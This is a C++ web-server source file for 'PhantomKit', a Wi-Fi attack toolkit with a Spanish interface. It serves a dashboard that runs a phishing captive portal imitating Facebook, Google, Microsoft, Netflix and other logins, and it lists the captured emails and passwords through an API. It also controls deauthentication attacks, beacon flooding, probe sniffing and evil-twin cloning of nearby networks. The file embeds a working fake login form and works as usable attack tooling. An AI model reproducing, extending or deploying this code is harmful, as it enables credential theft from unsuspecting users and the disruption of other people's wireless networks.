#include "web_server.h"
#include "config.h"
#include <LittleFS.h>

extern String logBuffer;

const char DASH_CSS[] PROGMEM = R"rawliteral(
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
.c{max-width:1200px;margin:0 auto;padding:16px}
header{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #1a1a2e;margin-bottom:16px}
.logo{display:flex;align-items:center;gap:12px}
.li{background:linear-gradient(135deg,#00d4ff,#7b2ff7);color:#000;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-weight:900;border-radius:6px}
h1{font-size:20px;color:#00d4ff;font-family:system-ui}
.st{display:flex;align-items:center;gap:8px;font-size:13px}
.dot{width:8px;height:8px;border-radius:50%;background:#333}
.dot.a{background:#00ff88;box-shadow:0 0 8px #00ff88}
.tabs{display:flex;gap:2px;margin-bottom:16px;border-bottom:1px solid #1a1a2e;overflow-x:auto}
.tab{background:none;border:none;color:#666;padding:10px 16px;cursor:pointer;font-family:inherit;font-size:12px;text-transform:uppercase;border-bottom:2px solid transparent;white-space:nowrap}
.tab:hover{color:#e0e0e0}
.tab.a{color:#00d4ff;border-bottom-color:#00d4ff}
.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}
.card{background:#12121a;border:1px solid #1a1a2e;border-radius:8px;padding:16px}
.card.f{grid-column:1/-1}
.card h2{font-size:13px;color:#00d4ff;margin-bottom:12px;text-transform:uppercase}
.fg{margin-bottom:12px}
.fg label{display:block;font-size:10px;color:#666;margin-bottom:4px;text-transform:uppercase}
.sd{background:#1a1a2e;padding:8px;border-radius:4px;font-size:13px;color:#00d4ff}
.ir{display:flex;gap:8px}
.ir input{flex:1;background:#1a1a2e;border:1px solid #1a1a2e;color:#e0e0e0;padding:8px;border-radius:4px;font-family:inherit}
input:focus,select:focus{outline:none;border-color:#00d4ff}
select{width:100%;background:#1a1a2e;border:1px solid #1a1a2e;color:#e0e0e0;padding:8px;border-radius:4px;font-family:inherit}
input[type=number],input[type=text]{width:100%;background:#1a1a2e;border:1px solid #1a1a2e;color:#e0e0e0;padding:8px;border-radius:4px;font-family:inherit}
.bg{display:flex;gap:8px;margin-top:16px}
.bs,.bp,.bd{padding:8px 16px;border:none;border-radius:4px;font-family:inherit;font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase}
.bs{background:#00d4ff;color:#000}
.bp{background:#1a1a2e;color:#e0e0e0}
.bd{background:#ff4444;color:#fff}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.stat{text-align:center;padding:12px 8px;background:#1a1a2e;border-radius:6px}
.sv{display:block;font-size:20px;font-weight:700;color:#00d4ff}
.sl{display:block;font-size:9px;color:#666;margin-top:2px;text-transform:uppercase}
table{width:100%;border-collapse:collapse}
th,td{padding:8px;text-align:left;border-bottom:1px solid #1a1a2e}
th{color:#666;font-size:9px;text-transform:uppercase}
td{font-size:11px}
#ct,#lt{max-height:200px;overflow-y:auto}
#lc{background:#050508;border:1px solid #1a1a2e;border-radius:6px;padding:12px;font-family:monospace;font-size:11px;color:#00ff88;max-height:150px;overflow-y:auto;white-space:pre-wrap;line-height:1.5}
.e{color:#333;text-align:center;padding:16px;font-style:italic}
.ti{display:flex;justify-content:space-between;align-items:center;padding:8px;background:#1a1a2e;border-radius:4px;margin-bottom:6px;cursor:pointer}
.ti:hover{background:#2a2a3e}
.ts{font-size:12px;color:#e0e0e0;font-weight:600}
.tb{font-size:10px;color:#666}
.tr{font-size:11px;color:#00d4ff}
@media(max-width:600px){.g{grid-template-columns:1fr}}
)rawliteral";

const char DASH_JS[] PROGMEM = R"rawliteral(
function showTab(btn,name){var tabs=document.querySelectorAll('[id^=tab-]');for(var i=0;i<tabs.length;i++)tabs[i].style.display='none';var btns=document.querySelectorAll('.tab');for(var i=0;i<btns.length;i++)btns[i].classList.remove('a');document.getElementById('tab-'+name).style.display='block';btn.classList.add('a')}
function p(u,d){return fetch(u,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:d})}
function uS(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){document.getElementById('sd').className='dot'+(d.portal_active?' a':'');document.getElementById('st').textContent=d.portal_active?'Activo':'Inactivo';document.getElementById('sC').textContent=d.clients;document.getElementById('sR').textContent=d.credentials;document.getElementById('sT').textContent=d.template_name;document.getElementById('cs').textContent=d.ssid;document.getElementById('bS').style.display=d.portal_active?'none':'block';document.getElementById('bP').style.display=d.portal_active?'block':'none';document.getElementById('sDF').textContent=d.deauth_frames;document.getElementById('sDS').textContent=d.deauth_active?'Activo':'Inactivo';document.getElementById('sDS').style.color=d.deauth_active?'#ff4444':'#666';document.getElementById('sBC').textContent=d.beacon_count;document.getElementById('sBS').textContent=d.beacon_active?'Activo':'Inactivo';document.getElementById('sBS').style.color=d.beacon_active?'#ff4444':'#666';document.getElementById('sPC').textContent=d.probe_count;document.getElementById('sPS').textContent=d.probe_active?'Activo':'Inactivo';document.getElementById('sES').textContent=d.eviltwin_active?'Activo':'Inactivo';document.getElementById('sES').style.color=d.eviltwin_active?'#ff4444':'#666'})}
function uC(){fetch('/api/credentials').then(function(r){return r.json()}).then(function(d){if(d.length===0){document.getElementById('ct').innerHTML='<p class=e>Sin credenciales</p>';return}var h='<table><thead><tr><th>Template</th><th>Campo1</th><th>Campo2</th><th>Hora</th></tr></thead><tbody>';for(var i=0;i<d.length;i++){var c=d[i];h+='<tr><td>'+c.template+'</td><td>'+c.field1+'</td><td>'+c.field2+'</td><td>'+c.time+'</td></tr>'}h+='</tbody></table>';document.getElementById('ct').innerHTML=h})}
function uL(){fetch('/api/log').then(function(r){return r.text()}).then(function(d){document.getElementById('lc').textContent=d})}
function tP(s){p('/api/control','action='+(s?'start':'stop')).then(uS)}
document.getElementById('ts').addEventListener('change',function(){p('/api/template','index='+this.value).then(uS)})
function cSSID(){var v=document.getElementById('si').value;if(v.length>0){p('/api/ssid','ssid='+v).then(function(){uS();document.getElementById('si').value=''})}}
function scanD(){p('/api/deauth','action=scan').then(function(r){return r.text()}).then(function(d){try{var t=JSON.parse(d);var h='';for(var i=0;i<t.length;i++){var x=t[i];h+='<div class=ti onclick="selD(\''+x.bssid+'\','+x.channel+')"><div><div class=ts>'+x.ssid+'</div><div class=tb>'+x.bssid+'</div></div><div class=tr>'+x.rssi+'dBm</div></div>'}document.getElementById('dt').innerHTML=h||'<p class=e>Sin redes</p>'}catch(e){}})}
function selD(b,c){document.getElementById('dB').value=b;document.getElementById('dCh').value=c}
function startD(){var b=document.getElementById('dB').value;var c=document.getElementById('dCh').value;if(b&&c){p('/api/deauth','action=start&bssid='+b+'&channel='+c).then(function(){uS();document.getElementById('bDS').style.display='none';document.getElementById('bDP').style.display='block'})}}
function stopD(){p('/api/deauth','action=stop').then(function(){uS();document.getElementById('bDS').style.display='block';document.getElementById('bDP').style.display='none'})}
function startB(){p('/api/beacon','action=start&channel='+document.getElementById('bCh').value).then(function(){uS();document.getElementById('bBS').style.display='none';document.getElementById('bBP').style.display='block'})}
function stopB(){p('/api/beacon','action=stop').then(function(){uS();document.getElementById('bBS').style.display='block';document.getElementById('bBP').style.display='none'})}
function startP(){p('/api/probe','action=start&channel='+document.getElementById('pCh').value).then(function(){uS();document.getElementById('bPS').style.display='none';document.getElementById('bPP').style.display='block'})}
function stopP(){p('/api/probe','action=stop').then(function(){uS();document.getElementById('bPS').style.display='block';document.getElementById('bPP').style.display='none'})}
function scanE(){p('/api/eviltwin','action=scan').then(function(r){return r.text()}).then(function(d){try{var t=JSON.parse(d);var h='';for(var i=0;i<t.length;i++){var x=t[i];h+='<div class=ti onclick="selE(\''+x.ssid+'\',\''+x.bssid+'\','+x.channel+')"><div><div class=ts>'+x.ssid+'</div><div class=tb>'+x.bssid+'</div></div><div class=tr>'+x.rssi+'dBm</div></div>'}document.getElementById('et').innerHTML=h||'<p class=e>Sin redes</p>'}catch(e){}})}
var selET={s:'',b:'',c:0};function selE(s,b,c){selET={s:s,b:b,c:c}}
function cloneE(){if(selET.b){p('/api/eviltwin','action=clone&ssid='+selET.s+'&bssid='+selET.b+'&channel='+selET.c).then(uS)}}
function stopE(){p('/api/eviltwin','action=stop').then(uS)}
uS();uC();uL();setInterval(uS,2000);setInterval(uC,3000);setInterval(uL,1000)
)rawliteral";

PhantomWebServer::PhantomWebServer(CredentialStore& store, CaptivePortal& portal, APManager& ap,
                                     DeauthModule& deauth, BeaconFloodModule& beacon,
                                     ProbeSnifferModule& probe, EvilTwinModule& evilTwin,
                                     AutoPortalModule& autoPortal)
    : server(80), store(store), portal(portal), ap(ap),
      deauth(deauth), beacon(beacon), probe(probe),
      evilTwin(evilTwin), autoPortal(autoPortal) {}

void PhantomWebServer::begin() {
    server.on("/dashboard", HTTP_GET, [this]() { handleDashboard(); });
    server.on("/api/status", HTTP_GET, [this]() { handleAPIStatus(); });
    server.on("/api/credentials", HTTP_GET, [this]() { handleAPICredentials(); });
    server.on("/api/log", HTTP_GET, [this]() { handleAPILog(); });
    server.on("/api/control", HTTP_POST, [this]() { handleAPIControl(); });
    server.on("/api/template", HTTP_POST, [this]() { handleAPITemplate(); });
    server.on("/api/ssid", HTTP_POST, [this]() { handleAPISSID(); });
    server.on("/api/clear", HTTP_POST, [this]() { handleAPIClear(); });
    server.on("/api/deauth", HTTP_POST, [this]() { handleAPIDeauth(); });
    server.on("/api/beacon", HTTP_POST, [this]() { handleAPIBeacon(); });
    server.on("/api/probe", HTTP_POST, [this]() { handleAPIProbe(); });
    server.on("/api/eviltwin", HTTP_POST, [this]() { handleAPIEvilTwin(); });
    server.on("/api/autoportal", HTTP_POST, [this]() { handleAPIAutoPortal(); });
    server.onNotFound([this]() {
        if (portal.isActive()) {
            String fn = String("/templates/") + TEMPLATES[portal.getCurrentTemplate()];
            if (LittleFS.exists(fn)) {
                File f = LittleFS.open(fn, "r");
                String c = f.readString();
                f.close();
                server.send(200, "text/html", c);
            } else {
                server.send(200, "text/html", "<html><body style='background:#f0f2f5;font-family:Arial'><div style='background:#fff;padding:30px;border-radius:8px;max-width:400px;margin:100px auto'><h2 style='color:#1877f2;text-align:center'>Iniciar Sesion</h2><form action='/login' method='POST'><input type='text' name='field1' placeholder='Email' style='width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px' required><input type='password' name='field2' placeholder='Contraseña' style='width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px' required><button style='width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px'>Continuar</button></form></div></body></html>");
            }
        } else {
            server.send(200, "text/html", "<html><body style='background:#0a0a0f;color:#e0e0e0;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0'><div style='text-align:center'><h1 style='color:#00d4ff'>PhantomKit</h1><p>Portal inactivo</p><a href='/dashboard' style='color:#00d4ff'>Dashboard</a></div></body></html>");
        }
    });
    server.begin();
}

void PhantomWebServer::handleClient() { server.handleClient(); }

void PhantomWebServer::handleDashboard() {
    String html;
    html.reserve(4096);
    
    html += "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>PhantomKit</title><style>";
    html += FPSTR(DASH_CSS);
    html += "</style></head><body><div class='c'>";
    
    html += "<header><div class='logo'><span class='li'>PK</span><h1>PhantomKit</h1></div><div class='st'><span class='dot' id='sd'></span><span id='st'>Inactivo</span></div></header>";
    
    html += "<nav class='tabs'>";
    html += "<button class='tab a' onclick='showTab(this,\"portal\")'>Portal</button>";
    html += "<button class='tab' onclick='showTab(this,\"deauth\")'>Deauth</button>";
    html += "<button class='tab' onclick='showTab(this,\"beacon\")'>Beacon</button>";
    html += "<button class='tab' onclick='showTab(this,\"probe\")'>Probe</button>";
    html += "<button class='tab' onclick='showTab(this,\"eviltwin\")'>Evil Twin</button>";
    html += "</nav>";
    
    html += "<div id='tab-portal'><div class='g'>";
    html += "<div class='card'><h2>Control del Portal</h2>";
    html += "<div class='fg'><label>SSID Actual</label><div class='sd' id='cs'>PhantomKit</div></div>";
    html += "<div class='fg'><label>Cambiar SSID</label><div class='ir'><input type='text' id='si' placeholder='Nuevo SSID' maxlength='32'><button class='bp' onclick='cSSID()'>Aplicar</button></div></div>";
    html += "<div class='fg'><label>Template</label><select id='ts'>";
    html += "<option value='0'>Facebook</option><option value='1'>Instagram</option><option value='2'>Microsoft</option>";
    html += "<option value='3'>X</option><option value='4'>Google</option><option value='5'>WiFi Login</option>";
    html += "<option value='6'>Netflix</option><option value='7'>WhatsApp</option>";
    html += "</select></div>";
    html += "<div class='bg'><button class='bs' id='bS' onclick='tP(1)'>Activar</button><button class='bp' id='bP' onclick='tP(0)' style='display:none'>Desactivar</button></div>";
    html += "</div>";
    
    html += "<div class='card'><h2>Estadisticas</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sC'>0</span><span class='sl'>Clientes</span></div>";
    html += "<div class='stat'><span class='sv' id='sR'>0</span><span class='sl'>Creds</span></div>";
    html += "<div class='stat'><span class='sv' id='sT'>-</span><span class='sl'>Template</span></div>";
    html += "</div></div>";
    
    html += "<div class='card f'><h2>Credenciales</h2><div id='ct'><p class='e'>Sin credenciales</p></div></div>";
    html += "</div></div>";
    
    html += "<div id='tab-deauth' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Deauth Attack</h2>";
    html += "<div class='fg'><button class='bp' onclick='scanD()'>Escanear Redes</button></div>";
    html += "<div id='dt'><p class='e'>Presiona Escanear</p></div>";
    html += "<div class='fg'><label>BSSID</label><input type='text' id='dB' placeholder='AA:BB:CC:DD:EE:FF'></div>";
    html += "<div class='fg'><label>Canal</label><input type='number' id='dCh' placeholder='1' min='1' max='13'></div>";
    html += "<div class='bg'><button class='bd' id='bDS' onclick='startD()'>Iniciar</button><button class='bp' id='bDP' onclick='stopD()' style='display:none'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sDF'>0</span><span class='sl'>Frames</span></div>";
    html += "<div class='stat'><span class='sv' id='sDS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";
    
    html += "<div id='tab-beacon' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Beacon Flood</h2>";
    html += "<p style='color:#666;font-size:12px;margin-bottom:12px'>Genera redes falsas</p>";
    html += "<div class='fg'><label>Canal</label><input type='number' id='bCh' value='6' min='1' max='13'></div>";
    html += "<div class='bg'><button class='bd' id='bBS' onclick='startB()'>Iniciar</button><button class='bp' id='bBP' onclick='stopB()' style='display:none'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sBC'>0</span><span class='sl'>Beacons</span></div>";
    html += "<div class='stat'><span class='sv' id='sBS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";
    
    html += "<div id='tab-probe' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Probe Sniffer</h2>";
    html += "<p style='color:#666;font-size:12px;margin-bottom:12px'>Captura redes buscadas</p>";
    html += "<div class='fg'><label>Canal</label><input type='number' id='pCh' value='6' min='1' max='13'></div>";
    html += "<div class='bg'><button class='bs' id='bPS' onclick='startP()'>Iniciar</button><button class='bp' id='bPP' onclick='stopP()' style='display:none'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card'><h2>Dispositivos</h2><div id='pd'><p class='e'>Inicia el sniffing</p></div></div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sPC'>0</span><span class='sl'>Probes</span></div>";
    html += "<div class='stat'><span class='sv' id='sPS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";
    
    html += "<div id='tab-eviltwin' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>Evil Twin</h2>";
    html += "<p style='color:#666;font-size:12px;margin-bottom:12px'>Clona una red</p>";
    html += "<div class='fg'><button class='bp' onclick='scanE()'>Escanear</button></div>";
    html += "<div id='et'><p class='e'>Presiona Escanear</p></div>";
    html += "<div class='bg'><button class='bd' onclick='cloneE()'>Clonar</button><button class='bp' onclick='stopE()'>Detener</button></div>";
    html += "</div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sES'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "<div class='stat'><span class='sv' id='sET'>-</span><span class='sl'>Objetivo</span></div>";
    html += "</div></div></div></div>";
    
    html += "<div class='card f'><h2>Logs</h2><div id='lc'></div></div>";
    html += "</div>";
    
    html += "<script>";
    html += FPSTR(DASH_JS);
    html += "</script></body></html>";
    
    server.send(200, "text/html", html);
}

void PhantomWebServer::handleAPIStatus() {
    String j = "{";
    j += "\"portal_active\":" + String(portal.isActive() ? "true" : "false") + ",";
    j += "\"template\":" + String(portal.getCurrentTemplate()) + ",";
    j += "\"template_name\":\"" + String(TEMPLATE_NAMES[portal.getCurrentTemplate()]) + "\",";
    j += "\"ssid\":\"" + ap.getSSID() + "\",";
    j += "\"clients\":" + String(ap.getClientCount()) + ",";
    j += "\"credentials\":" + String(store.getCount()) + ",";
    j += "\"deauth_active\":" + String(deauth.isRunning() ? "true" : "false") + ",";
    j += "\"deauth_frames\":" + String(deauth.getFramesSent()) + ",";
    j += "\"beacon_active\":" + String(beacon.isRunning() ? "true" : "false") + ",";
    j += "\"beacon_count\":" + String(beacon.getBeaconsSent()) + ",";
    j += "\"probe_active\":" + String(probe.isRunning() ? "true" : "false") + ",";
    j += "\"probe_count\":" + String(probe.getProbesCaptured()) + ",";
    j += "\"eviltwin_active\":" + String(evilTwin.isActive() ? "true" : "false");
    j += "}";
    server.send(200, "application/json", j);
}

void PhantomWebServer::handleAPICredentials() {
    server.send(200, "application/json", store.getCredentialsJSON());
}

void PhantomWebServer::handleAPILog() {
    server.send(200, "text/plain", logBuffer);
}

void PhantomWebServer::handleAPIControl() {
    String a = server.arg("action");
    if (a == "start") { portal.setActive(true); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { portal.setActive(false); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPITemplate() {
    int i = server.arg("index").toInt();
    if (i >= 0 && i < TEMPLATE_COUNT) { portal.setTemplate(i); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPISSID() {
    String s = server.arg("ssid");
    if (s.length() > 0 && s.length() <= 32) { ap.setSSID(s); ap.restartAP(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIClear() { store.clear(); server.send(200, "text/plain", "OK"); }

void PhantomWebServer::handleAPIDeauth() {
    String a = server.arg("action");
    if (a == "start") { deauth.startAttack(server.arg("bssid"), server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { deauth.stopAttack(); server.send(200, "text/plain", "OK"); }
    else if (a == "scan") { deauth.scanAllChannels(); server.send(200, "text/plain", deauth.getTargetsJSON()); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIBeacon() {
    String a = server.arg("action");
    if (a == "start") { beacon.startFlood(server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { beacon.stopFlood(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIProbe() {
    String a = server.arg("action");
    if (a == "start") { probe.startSniffing(server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { probe.stopSniffing(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIEvilTwin() {
    String a = server.arg("action");
    if (a == "scan") { evilTwin.scanAllChannels(); server.send(200, "text/plain", evilTwin.getTargetsJSON()); }
    else if (a == "clone") { evilTwin.cloneTarget(server.arg("ssid"), server.arg("bssid"), server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { evilTwin.stopClone(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIAutoPortal() {
    String a = server.arg("action");
    if (a == "start") { autoPortal.startAutoScan(); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { autoPortal.stopAutoScan(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}
